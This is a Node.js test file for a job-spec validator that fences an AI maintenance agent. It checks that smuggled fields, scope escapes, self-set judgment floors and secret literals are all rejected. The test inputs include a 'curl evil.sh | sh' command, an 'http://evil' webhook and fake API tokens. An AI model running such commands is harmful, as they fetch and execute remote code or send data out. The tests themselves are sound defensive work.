// N1 exit criteria: the job spec (the ARBITER side) is pure declarative data;
// every fit-to-pass surface reds with a pinned code+path before tokens exist.
// Reference semantics: F4's POC (poc/n1-job-schema.mjs) — 20 cases, negatives
// mutation-validated there. Cases are table-driven over inline mutators of the
// REAL job #1 spec (PRD §6): one defect per case, exactly one red — mutators
// over a shared base keep single-defect isolation without a fixture file per
// red. The two-layer checks (job fence vs workflow scope, ceiling chain) live
// here too: they need both documents.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { validateJob, jobSpecHash, checkApproval, CLASS_BY_CLOSE, CLOSE_TYPES, CLASSES, TOOL_MENU, LOCKED_TOOLS } from '../src/job.js';
import { validateConfig } from '../src/validate.js';

// Job #1 exactly as the PRD §6 defines it — real target, not a fixture
// authored to pass. writeScope is operator law (interview decision #4);
// conditions is the environment label (decision #3, consumed at N3).
const JOB1 = {
  schema: 'job-v1',
  job: 'litectx-maintainer',
  description: 'review -> fix -> branch -> PR on litectx; suite+lint are the hard closes; merge stays human forever',
  provider: 'anthropic-api',
  conditions: { closeVerbosity: 'counts-only' },
  cadence: { unit: 'day', every: 1 },
  budgetUsd: 1.5,
  writeScope: ['src/**', 'test/**'],
  steps: [
    { id: 'review', close: { type: 'predicate', cmd: 'npm test', expect: 0 }, class: 'hard' },
    { id: 'fix', close: { type: 'predicate', cmd: 'npm run lint', expect: 0 }, class: 'hard' },
    { id: 'pr', close: { type: 'hitl', prompt: 'PR opened — review and merge?' }, class: 'hitl' },
  ],
  escalation: { mode: 'decision-ready' },
};

const clone = (o) => JSON.parse(JSON.stringify(o));
const mut = (fn) => { const j = clone(JOB1); fn(j); return j; };

test('job #1 validates green and returns the normalized spec', () => {
  const r = validateJob(JOB1);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
  assert.deepEqual(r.job, JOB1);
});

test('string input single-parses; invalid JSON is a parse-error red, job null', () => {
  const ok = validateJob(JSON.stringify(JOB1));
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.job, JOB1);
  const bad = validateJob('{nope');
  assert.equal(bad.ok, false);
  assert.equal(bad.reds[0].code, 'parse-error');
  assert.equal(bad.job, null);
});

test('garbage input types → parse-error red, never a throw', () => {
  for (const garbage of [42, null, true, [], undefined]) {
    const r = validateJob(garbage);
    assert.equal(r.ok, false, `${JSON.stringify(garbage)} must red`);
    assert.equal(r.reds[0].code, 'parse-error');
  }
});

// Each entry is an ATTACK or a defect: [name, mutator, 'code:path'].
// Exactly ONE red — a case that also trips a second red is a table bug, not
// tolerance ("some red somewhere" lets a wrong-reason red fake a pass, F4).
const RED_CASES = [
  // -- the arbiter split, job side (workflow side is tested through validateConfig below) --
  ['hooks (agent-domain) smuggled into the job spec', (j) => { j.hooks = { 'on-green': [{ op: 'remember' }] }; }, 'unknown-field:hooks'],
  ['loop (agent-domain) smuggled into the job spec', (j) => { j.loop = { shape: 'refine' }; }, 'unknown-field:loop'],
  ['minting claim on a close', (j) => { j.steps[1].close.mints = true; }, 'unknown-field:steps.1.close.mints'],
  ['retry cap is shell-owned — inexpressible here', (j) => { j.capRuns = 9; }, 'unknown-field:capRuns'],

  // -- fit-to-pass laundering (the close hierarchy) --
  ['rubric close claiming class hard', (j) => { j.steps[1].close = { type: 'rubric', criteria: 'code looks good' }; j.steps[1].class = 'hard'; }, 'close-hierarchy:steps.1.class'],
  ['hitl class on a predicate close (a human IS the close)', (j) => { j.steps[0].class = 'hitl'; }, 'close-hierarchy:steps.0.class'],
  ['hard class on a hitl close (merge stays human)', (j) => { j.steps[2].class = 'hard'; }, 'close-hierarchy:steps.2.class'],
  ['freeform-code close type', (j) => { j.steps[0].close = { type: 'js', code: 'return true' }; }, 'close-type:steps.0.close.type'],
  ['script field smuggled into a predicate close', (j) => { j.steps[0].close.script = 'exit 0'; }, 'unknown-field:steps.0.close.script'],
  ['gold close with a freeform comparator', (j) => { j.steps[1].close = { type: 'gold', expected: '42', compare: 'my-fuzzy-match' }; }, 'invalid-value:steps.1.close.compare'],

  // -- the budget hard line (ceiling chain: job <= shell) --
  ['budget above the shell cap', (j) => { j.budgetUsd = 50; }, 'bounds:budgetUsd'],
  ['zero budget', (j) => { j.budgetUsd = 0; }, 'bounds:budgetUsd'],

  // -- ungated spend --
  ['step without a close', (j) => { delete j.steps[1].close; }, 'missing-required:steps.1.close'],
  ['empty steps', (j) => { j.steps = []; }, 'missing-required:steps'],
  ['missing escalation (the pain channel is not optional)', (j) => { delete j.escalation; }, 'missing-required:escalation.mode'],
  ['step class missing', (j) => { delete j.steps[0].class; }, 'missing-required:steps.0.class'],
  ['step class outside the menu', (j) => { j.steps[0].class = 'auto'; }, 'invalid-value:steps.0.class'],

  // -- the operator's write fence (same containment law as the workflow layer) --
  ['writeScope missing (the fence is operator law)', (j) => { delete j.writeScope; }, 'missing-required:writeScope'],
  ['fence escaping the run dir', (j) => { j.writeScope = ['../**']; }, 'invalid-value:writeScope'],
  ['fence with a mid-path wildcard (inexpressible in enforcement, F9)', (j) => { j.writeScope = ['src/*/gen/**']; }, 'invalid-value:writeScope'],
  ['absolute fence', (j) => { j.writeScope = ['/etc/**']; }, 'invalid-value:writeScope'],
  ['whole-run-dir fence (the close lives there)', (j) => { j.writeScope = ['./**']; }, 'invalid-value:writeScope'],

  // -- the environment label (declared keys only, V3) --
  ['unknown condition key', (j) => { j.conditions.weather = 'sunny'; }, 'unknown-field:conditions.weather'],
  ['non-string condition value', (j) => { j.conditions.closeVerbosity = 42; }, 'invalid-value:conditions.closeVerbosity'],

  // -- spec hygiene --
  ['wrong schema tag', (j) => { j.schema = 'v1'; }, 'invalid-value:schema'],
  ['non-slug job name', (j) => { j.job = 'My Job!'; }, 'invalid-value:job'],
  ['unknown top-level field', (j) => { j.frequency = 'often'; }, 'unknown-field:frequency'],
  ['duplicate step ids', (j) => { j.steps[1].id = 'review'; }, 'duplicate-id:steps.1.id'],
  ['provider outside the menu', (j) => { j.provider = 'local-llama'; }, 'invalid-value:provider'],
  ['cadence bounds', (j) => { j.cadence.every = 0; }, 'bounds:cadence.every'],
  ['cadence not an object (one red naming cadence, not two at paths that do not exist)', (j) => { j.cadence = 'daily'; }, 'invalid-value:cadence'],
  ['cadence unit outside the menu', (j) => { j.cadence.unit = 'fortnight'; }, 'invalid-value:cadence.unit'],
  ['rubric close without criteria', (j) => { j.steps[1].close = { type: 'rubric' }; j.steps[1].class = 'soft'; }, 'missing-required:steps.1.close.criteria'],
  ['hitl close without a prompt', (j) => { delete j.steps[2].close.prompt; }, 'missing-required:steps.2.close.prompt'],
  ['predicate expect not an exit code', (j) => { j.steps[0].close.expect = 'zero'; }, 'invalid-value:steps.0.close.expect'],
  ['quote characters in a predicate cmd (argv is whitespace-split, no shell — N2 design default)', (j) => { j.steps[0].close.cmd = 'node -e "process.exit(0)"'; }, 'invalid-value:steps.0.close.cmd'],

  // -- nested smuggle channels (review F1: every level reds unknown keys, not just some) --
  ['unknown field inside cadence', (j) => { j.cadence.exfil = 'x'; }, 'unknown-field:cadence.exfil'],
  ['unknown field inside escalation', (j) => { j.escalation.webhook = 'http://evil'; }, 'unknown-field:escalation.webhook'],

  // -- secrets (defense-in-depth: known literal shapes; env-only loading stays the hard line) --
  ['inline API key in the description', (j) => { j.description = 'use key sk-ant-api03-abcdefghijklmnop to auth'; }, 'secret-literal:description'],
  ['token smuggled deep in a close cmd', (j) => { j.steps[0].close.cmd = 'GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuv npm test'; }, 'secret-literal:steps.0.close.cmd'],
  ['secret-shaped KEY inside a gold expected (keys are swept too, release review)', (j) => { j.steps[1].close = { type: 'gold', expected: { ghp_abcdefghijklmnopqrstuv: true }, compare: 'json-equal' }; }, 'secret-literal:steps.1.close.expected.ghp_abcdefghijklmnopqrstuv'],
];

for (const [name, fn, want] of RED_CASES) {
  test(`red: ${name} → ${want}`, () => {
    const r = validateJob(mut(fn));
    assert.equal(r.ok, false, 'must red');
    assert.equal(r.reds.length, 1, `exactly one red, got: ${JSON.stringify(r.reds)}`);
    assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, want);
    assert.equal(r.job, null);
  });
}

test('hyphenated words containing "sk-"/"pat_" shapes do not red (review: SECRET_RE left boundary, both hyphen depths)', () => {
  const r = validateJob(mut((j) => { j.description = 'migrate the flask-sqlalchemy-based models and task-1234567890abcdefgh queues'; }));
  assert.deepEqual(r.reds, []);
  // R2: a hyphen/underscore-delimited segment one deeper must also pass ("-sk-", not just "ask-")
  const r2 = validateJob(mut((j) => { j.description = 'run pipeline-sk-transform-utils-v2 and build_sk_widgets_frontend_v2'; }));
  assert.deepEqual(r2.reds, [], 'kebab/snake package names are not secrets');
  // ...but a REAL boundary-delimited key still reds (feat intact)
  const r3 = validateJob(mut((j) => { j.description = 'token is sk-ant-api03-abcdefghijklmnop here'; }));
  assert.equal(r3.reds[0]?.code, 'secret-literal');
});

test('the returned job is the same reference AND survives a fresh-copy comparison (review: no aliasing tautology)', () => {
  const fresh = clone(JOB1);
  const r = validateJob(JOB1);
  assert.equal(r.job, JOB1, 'reference echo is the contract');
  assert.deepEqual(r.job, fresh, 'validation must not mutate the spec');
});

test('hash follows JSON semantics: undefined keys AND toJSON objects hash like their disk round-trip (review: approval survives save/reload)', () => {
  const j = clone(JOB1);
  j.conditions = undefined;
  assert.equal(jobSpecHash(j), jobSpecHash(JSON.parse(JSON.stringify(j))));
  // R2: a toJSON-bearing value (Date) must not collapse to {} — distinct values must not collide, and must match the disk form
  const d1 = jobSpecHash({ a: new Date('2026-01-01') });
  assert.notEqual(d1, jobSpecHash({ a: new Date('1999-12-31') }), 'distinct Dates must not collide');
  assert.notEqual(d1, jobSpecHash({ a: {} }), 'a Date must not hash as an empty object');
  assert.equal(d1, jobSpecHash(JSON.parse(JSON.stringify({ a: new Date('2026-01-01') }))), 'in-memory hash equals disk round-trip');
});

test('jobSpecHash NEVER throws — the minting path (runner calls it directly) gets a hash, not a crash (review R2)', () => {
  assert.match(jobSpecHash(undefined), /^[0-9a-f]{64}$/);
  assert.match(jobSpecHash(null), /^[0-9a-f]{64}$/);
  assert.match(jobSpecHash({ a: 1n }), /^[0-9a-f]{64}$/, 'BigInt spec hashes (minting path) instead of throwing');
  const cyclic = {}; cyclic.self = cyclic;
  assert.match(jobSpecHash(cyclic), /^[0-9a-f]{64}$/, 'a cycle hashes instead of throwing');
  assert.equal(checkApproval({ a: 1n }, [{ specHash: 'x' }]), false, 'BigInt spec → false');
  assert.equal(checkApproval(undefined, [{ specHash: 'x' }]), false);
});

test('un-hashable specs never cross-approve — the sentinel hash is not an equivalence class (release review)', () => {
  const cyclic = {}; cyclic.self = cyclic;
  assert.equal(checkApproval(cyclic, [{ specHash: jobSpecHash({ a: 1n }) }]), false, 'an approval minted for one un-hashable spec must not authorize another');
  assert.equal(checkApproval(cyclic, [{ specHash: jobSpecHash(cyclic) }]), false, 'not even its own sentinel approves');
});

test('the arbiter menus are frozen — verdict-class laundering cannot be enabled by mutation (review)', () => {
  assert.ok(Object.isFrozen(CLASS_BY_CLOSE) && Object.isFrozen(CLASS_BY_CLOSE.rubric) && Object.isFrozen(CLOSE_TYPES) && Object.isFrozen(CLASSES));
  assert.throws(() => { CLASS_BY_CLOSE.rubric.push('hard'); }, TypeError);
});

test('an env REFERENCE in a close cmd does not red the secret sweep — only literals do', () => {
  // quote-free spelling: cmd runs as whitespace-split argv with no shell, so the
  // old `X="$X" npm test` form was always a misparse (and now reds on quotes)
  const r = validateJob(mut((j) => { j.steps[0].close.cmd = 'npm test --auth-env GITHUB_TOKEN'; }));
  assert.deepEqual(r.reds, []);
});

test('the shell cap is the ceiling the shell sets (job 1.5 passes under 2, reds under 1)', () => {
  assert.equal(validateJob(JOB1, { shellCapUsd: 2 }).ok, true);
  const r = validateJob(JOB1, { shellCapUsd: 1 });
  assert.equal(r.ok, false);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'bounds:budgetUsd');
});

// ---- the arbiter split, workflow side: REAL shipped path, not a replica ----

const WF = JSON.parse(readFileSync(new URL('./fixtures/valid.json', import.meta.url), 'utf8'));

test('workflow config smuggling a close still reds in v1', () => {
  const r = validateConfig({ ...WF, close: { type: 'predicate', cmd: 'true', expect: 0 } });
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => `${x.code}:${x.path}` === 'unknown-field:close'));
});

// ---- {ok, reds, config}: the double-parse dies ----

test('validateConfig returns the parsed config on ok, null on red', () => {
  const ok = validateConfig(JSON.stringify(WF));
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.config, WF);
  const red = validateConfig({ ...WF, schema: 'v9' });
  assert.equal(red.ok, false);
  assert.equal(red.config, null);
});

// ---- two-layer fence: workflow scope must fit inside the job's (decision #4) ----

test('workflow scope inside the job fence passes; outside reds scope-escape', () => {
  const inside = validateConfig({ ...WF, gate: { budgetUsd: 1, writeScope: ['src/gen/**'] } }, { jobWriteScope: JOB1.writeScope });
  assert.deepEqual(inside.reds, []);
  const equal = validateConfig(WF, { jobWriteScope: JOB1.writeScope });
  assert.deepEqual(equal.reds, []);
  const outside = validateConfig({ ...WF, gate: { budgetUsd: 1, writeScope: ['docs/**'] } }, { jobWriteScope: JOB1.writeScope });
  assert.equal(outside.ok, false);
  assert.equal(`${outside.reds[0].code}:${outside.reds[0].path}`, 'scope-escape:gate.writeScope.0');
});

test('prefix-boundary trap: src2/** is NOT inside src/** (string prefix is not path prefix)', () => {
  const r = validateConfig({ ...WF, gate: { budgetUsd: 1, writeScope: ['src2/**'] } }, { jobWriteScope: ['src/**'] });
  assert.equal(r.ok, false);
  assert.equal(r.reds[0].code, 'scope-escape');
});

test('leading ./ normalizes across the layers (./src/** fits inside src/**)', () => {
  const r = validateConfig({ ...WF, gate: { budgetUsd: 1, writeScope: ['./src/**'] } }, { jobWriteScope: ['src/**'] });
  assert.deepEqual(r.reds, []);
});

test('without the jobWriteScope opt, behavior is unchanged (N0 shape)', () => {
  const r = validateConfig({ ...WF, gate: { budgetUsd: 1, writeScope: ['docs/**'] } });
  assert.equal(r.ok, true);
});

// ---- signing: hash + approval record (the runner enforces at N2; pure here) ----

test('jobSpecHash is stable under key order and 64-hex', () => {
  const reordered = { escalation: JOB1.escalation, steps: JOB1.steps, writeScope: JOB1.writeScope, budgetUsd: JOB1.budgetUsd, cadence: JOB1.cadence, conditions: JOB1.conditions, provider: JOB1.provider, description: JOB1.description, job: JOB1.job, schema: JOB1.schema };
  assert.equal(jobSpecHash(JOB1), jobSpecHash(reordered));
  assert.match(jobSpecHash(JOB1), /^[0-9a-f]{64}$/);
});

test('any spec change changes the hash (approval binds to the exact version)', () => {
  assert.notEqual(jobSpecHash(JOB1), jobSpecHash(mut((j) => { j.budgetUsd = 1.4; })));
  assert.notEqual(jobSpecHash(JOB1), jobSpecHash(mut((j) => { j.steps[0].close.cmd = 'npm test --silent'; })));
});

test('checkApproval: matching record approves; stale hash, empty, or garbage never do — and never throw', () => {
  const signed = [{ specHash: jobSpecHash(JOB1), signer: 'hamr', ts: '2026-07-12T00:00:00Z' }];
  assert.equal(checkApproval(JOB1, signed), true);
  assert.equal(checkApproval(mut((j) => { j.budgetUsd = 1.4; }), signed), false, 'edited spec must re-approve');
  assert.equal(checkApproval(JOB1, []), false);
  for (const garbage of [undefined, null, 42, 'yes', [{}], [{ specHash: 7 }]]) {
    assert.equal(checkApproval(JOB1, garbage), false, `${JSON.stringify(garbage)} must not approve`);
  }
});

// ---- module 2b: step mode/tools — the spec-side tool grant (addendum 2026-07-12b) ----
// The job spec (human) owns mode + menu; the drafted config cannot express either.
// TOOL_MENU is read/grep/write ONLY: `run` is locked-but-listed — requesting it is
// the request-red surface, a DISTINCT `request-red` code (module 4): the ledger
// counts admission demand, and a generic invalid-value would be indistinguishable
// from a typo. Still a red, never a grant.

test('tools step legal: mode "tools" + granted menu validates green', () => {
  const j = mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'grep', 'write'] }; });
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('mode "tools" without tools is legal (runner defaults to the full menu)', () => {
  const j = mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools' }; });
  assert.equal(validateJob(j).ok, true);
});

test('explicit mode "text" is legal (the default, spelled out)', () => {
  const j = mut((x) => { x.steps[0] = { ...x.steps[0], mode: 'text' }; });
  assert.equal(validateJob(j).ok, true);
});

test('TOOL_MENU ships frozen: file tools + the two retrieval verbs + the edit verb — run is NOT in the menu', () => {
  assert.deepEqual([...TOOL_MENU], ['read', 'grep', 'write', 'edit', 'recall', 'get']);
  assert.ok(Object.isFrozen(TOOL_MENU));
  // The line the menu exists to hold (F19): admitting retrieval must NOT admit execution.
  // A worker that can run commands can run its own close — it grades its own exam.
  // `edit` (BA-13) is a WRITE-class verb bounded by the same fence as write — it
  // admits no execution either.
  assert.ok(!TOOL_MENU.includes('run'), 'run stays locked — retrieval is read-only, not a foot in the door');
  assert.deepEqual([...LOCKED_TOOLS], ['run']);
});

test('BA-13: an "edit" grant validates green — the anchored edit verb is spec-grantable', () => {
  const j = mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'edit'] }; });
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('request-red detail names the locked verb in quotes (the ledger extracts it)', () => {
  const r = validateJob(mut((x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['run'] }; }));
  const red = r.reds.find((d) => d.code === 'request-red');
  assert.ok(red, `expected a request-red, got ${JSON.stringify(r.reds)}`);
  assert.equal(red.verb, 'run', 'the verb rides the red as a STRUCTURED field — the ledger keys on it');
  assert.match(red.detail ?? '', /"run"/);
});

test('single-defect mode/tools reds: pinned code + path', () => {
  const cases = [
    ['mode outside the menu', (x) => { x.steps[0].mode = 'agent'; }, 'invalid-value', 'steps.0.mode'],
    ['run is locked: requesting it is a request-red, not a typo', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'run'] }; }, 'request-red', 'steps.1.tools'],
    ['run alone is still a request-red', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['run'] }; }, 'request-red', 'steps.1.tools'],
    ['an unknown tool is a typo: invalid-value, never request-red', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'bash'] }; }, 'invalid-value', 'steps.1.tools'],
    ['tools on a text step: a grant without the mode is incoherent', (x) => { x.steps[0].tools = ['read']; }, 'invalid-value', 'steps.0.tools'],
    ['tools empty array: a tools step with no tools is ungrantable', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: [] }; }, 'invalid-value', 'steps.1.tools'],
    ['tools non-array', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: 'read' }; }, 'invalid-value', 'steps.1.tools'],
    ['duplicate tool entries', (x) => { x.steps[1] = { ...x.steps[1], mode: 'tools', tools: ['read', 'read'] }; }, 'invalid-value', 'steps.1.tools'],
    ['mode on a hitl step: hitl runs no loop', (x) => { x.steps[2] = { ...x.steps[2], mode: 'tools' }; }, 'invalid-value', 'steps.2.mode'],
    ['tools on a hitl step', (x) => { x.steps[2] = { ...x.steps[2], mode: 'tools', tools: ['read'] }; }, 'invalid-value', 'steps.2.mode'],
  ];
  for (const [name, mutate, code, path] of cases) {
    const r = validateJob(mut(mutate));
    assert.equal(r.ok, false, `${name}: must red`);
    assert.ok(r.reds.some((red) => red.code === code && red.path === path),
      `${name}: expected ${code}@${path}, got ${JSON.stringify(r.reds)}`);
    assert.equal(r.job, null, `${name}: job must be null on red`);
  }
});

test('close.cmd leading/trailing whitespace reds — argv splits on whitespace; honest refusal beats a silent misparse', () => {
  for (const cmd of [' npm test', 'npm test ', '\tnpm test']) {
    const r = validateJob(mut((x) => { x.steps[0].close.cmd = cmd; }));
    assert.equal(r.ok, false, `${JSON.stringify(cmd)} must red`);
    assert.ok(r.reds.some((d) => d.code === 'invalid-value' && d.path === 'steps.0.close.cmd'),
      `${JSON.stringify(cmd)}: expected invalid-value@steps.0.close.cmd, got ${JSON.stringify(r.reds)}`);
  }
});

// ─── the judgment-rendered signal (PRD v1.11 / F17, optional but validated) ───

test('a close may declare how it evidences judgment — pattern + floor', () => {
  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 300 }; });
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.job.steps[0].close.judged.min, 300);
});

test('judged is OPTIONAL — a close with no countable output (a linter, a hitl) stays writable', () => {
  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no judged block and must still validate');
});

test('a judged pattern with no capture group reds — it would crash EVERY close, forever', () => {
  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests \\d+$', min: 3 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /capture group/.test(x.detail)),
    'the count is read from group 1 — a pattern that captures nothing is a dead arbiter');
});

test('a judged pattern that does not compile reds at validation, not at run time', () => {
  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests ((\\d+$', min: 3 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.pattern' && /RegExp/.test(x.detail)));
});

test('a judgment floor of 0 reds — it is satisfied by judging nothing, which is the check itself', () => {
  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 0 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.judged.min'));
});

test('unknown fields inside judged red (a script body cannot smuggle in through it)', () => {
  const j = mut((s) => { s.steps[0].close.judged = { pattern: '^tests (\\d+)$', min: 3, cmd: 'curl evil.sh | sh' }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.0.close.judged.cmd'));
});

test('judged is inexpressible on a hitl close — a human IS the judgment, there is nothing to count', () => {
  const j = mut((s) => { s.steps[2].close.judged = { pattern: '^tests (\\d+)$', min: 3 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.2.close.judged'));
});

// ─── the kept-failures pattern (F28, optional, validated like judged.pattern) ─
// The gap bound (ralph.boundGap) elides the middle of a large close stream, and a
// big TAP suite prints its `not ok` lines THERE — so the failing-test names never
// reach the worker. gapKeep is a regex SOURCE whose matching lines are preserved.

test('a close may declare gapKeep — a regex source whose matching lines survive the gap bound (F28)', () => {
  const j = mut((s) => { s.steps[0].close.gapKeep = '^not ok'; });
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.job.steps[0].close.gapKeep, '^not ok');
});

test('gapKeep is OPTIONAL — a close without it validates and keeps exactly today\'s bound', () => {
  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no gapKeep and must still validate');
});

test('a gapKeep that does not compile reds at validation, not at run time (mirrors judged.pattern)', () => {
  const j = mut((s) => { s.steps[0].close.gapKeep = '^not ok ('; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'steps.0.close.gapKeep' && /RegExp/.test(x.detail)),
    'reds-before-tokens: an invalid keep pattern is a spec red, never a runtime crash');
});

test('an empty or non-string gapKeep reds — it is a regex SOURCE, not an object or blank', () => {
  for (const bad of ['', { pattern: 'x' }, 3]) {
    const r = validateJob(mut((s) => { s.steps[0].close.gapKeep = bad; }));
    assert.equal(r.ok, false, `${JSON.stringify(bad)} must red`);
    assert.ok(r.reds.some((x) => x.path === 'steps.0.close.gapKeep'));
  }
});

test('gapKeep is inexpressible on a hitl close — a human close renders no stream to keep lines from', () => {
  const j = mut((s) => { s.steps[2].close.gapKeep = '^not ok'; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'steps.2.close.gapKeep'));
});

test('judged is inexpressible in the AGENT-drafted workflow config — the arbiter stays out of reach', () => {
  const cfg = {
    schema: 'v1', loop: { shape: 'refine', maxIterations: 3 },
    memory: { store: 'litectx', recall: { k: 5, kinds: ['fact'] }, compressLevel: 'verbatim' },
    hooks: {}, gate: { budgetUsd: 1, writeScope: ['src/**'], judged: { pattern: '(\\d+)', min: 1 } },
    escalation: { mode: 'decision-ready' },
  };
  const r = validateConfig(cfg, { shellCapUsd: 2 });
  assert.equal(r.ok, false, 'an agent that could lower its own judgment floor could author a fake green');
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && /judged/.test(x.path)));
});
